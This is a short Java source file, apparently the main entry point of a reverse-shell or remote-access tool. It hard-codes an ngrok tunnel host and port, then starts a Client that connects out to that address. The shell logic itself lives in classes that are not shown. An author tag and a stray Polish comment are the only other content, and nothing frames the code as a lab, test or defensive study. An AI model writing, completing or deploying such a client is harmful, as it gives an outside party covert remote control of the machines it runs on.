package shell;

import java.io.IOException;
import java.net.UnknownHostException;

public class Main {

	public static void main(String args[]) throws UnknownHostException, IOException {
		String host = "0.tcp.ngrok.io";
		int port = 12853;
	    System.out.print(Handler.author);
		Client c = new Client(host,port);
		c.run();
		
		// racisz?
		
		// By Fluxmc
	}
}
